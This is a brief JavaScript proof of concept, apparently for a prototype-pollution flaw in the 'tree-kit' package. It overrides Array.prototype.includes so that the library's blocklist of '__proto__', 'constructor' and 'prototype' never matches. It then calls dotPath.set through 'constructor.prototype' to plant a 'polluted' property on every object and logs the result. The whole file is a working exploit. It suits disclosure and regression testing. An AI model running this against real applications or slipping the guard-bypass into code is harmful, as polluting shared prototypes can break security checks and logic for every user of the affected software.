Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const {dotPath} = require('tree-kit');
obj = {};
console.log({}.polluted);
dotPath.set({}, [
    'constructor.prototype',
    'polluted'
], 'yes');
console.log({}.polluted);